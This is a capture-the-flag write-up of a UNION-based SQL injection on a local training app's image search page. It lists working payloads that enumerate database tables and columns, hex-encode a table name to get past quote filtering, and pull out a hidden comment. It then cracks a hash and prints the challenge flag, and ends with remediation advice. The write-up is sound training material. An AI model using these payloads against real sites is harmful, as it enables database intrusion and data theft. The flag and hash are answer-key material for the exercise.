# Member SQL Injection - Images

## Vulnerability Type
**OWASP A03:2021 - Injection** (CWE-89: SQL Injection with UNION-based extraction)

## Summary

page: `http://localhost:8081/index.php?page=searchimg`
commands:
```sql
5
1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()
1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573
1 UNION SELECT comment, title FROM list_images WHERE id=5
```
Then crack MD5 `1928e8083cf461a51303633093573c46` → `albatroz` → SHA256:
```bash
echo -n "albatroz" | shasum -a 256
```
flag is f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Overview
SQL injection on the image search page: `http://localhost:8080/index.php?page=searchimg`

## Discovery

Entering ID 5 returns normal results:
```
ID: 5
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

## Enumeration - Finding Tables

Inject to discover table names:
```sql
1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()
```

Result reveals table `Member_images` exists.

## How UNION Injection Works

The backend likely runs:
```sql
SELECT title, url FROM list_images WHERE id = 1
```

When you inject a UNION, it becomes:
```sql
SELECT title, url FROM list_images WHERE id = 1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()
```

**Key point:** Both SELECT clauses must return the same number of columns (2 in this case). The injected SELECT uses columns from `information_schema.tables`, while the original uses columns from `list_images`.

- `FROM list_images` returns: `title`, `url`
- `FROM information_schema.tables` returns: `table_name`, `table_schema`, `engine`, `table_rows`, etc.

## Enumeration - Finding Columns

To find columns in `list_images`, try:
```sql
1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='list_images'
```

**This fails** because quotes may be filtered. Use hex encoding instead:
```sql
1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573
```

`0x6c6973745f696d61676573` is the hex-encoded version of `list_images`. This bypasses quote filtering without triggering WAF rules.

Convert strings to hex:
```bash
echo -n "list_images" | xxd -p
# Output: 6c6973745f696d61676573
# Use as: 0x6c6973745f696d61676573
```

Result shows a `comment` column exists - this looks promising!

## Exploitation - Extracting the Flag

Query the actual table:
```sql
1 UNION SELECT comment, title FROM list_images WHERE id=5
```

Returns:
```
1 UNION SELECT comment, title FROM list_images WHERE id=5
Title: Hack me ?
Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

The comment contains an MD5 hash: `1928e8083cf461a51303633093573c46`

## Flag Decoding

1. Crack the MD5 on crackstation.net → `albatroz`
2. Hash it with SHA256:
```bash
echo -n "albatroz" | shasum -a 256
# Output: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

**Flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## Remediation
1. **Use parameterized queries** – Prevent SQL syntax from user input
2. **Input validation** – Restrict ID to numeric values only
3. **Limit output columns** – Only expose necessary data, not entire database schema
4. **Restrict information_schema access** – Non-admin database users should not access metadata
5. **Query timeouts** – Prevent expensive enumeration queries from running indefinitely
6. **Monitor slow queries** – Alert on suspicious UNION or subquery patterns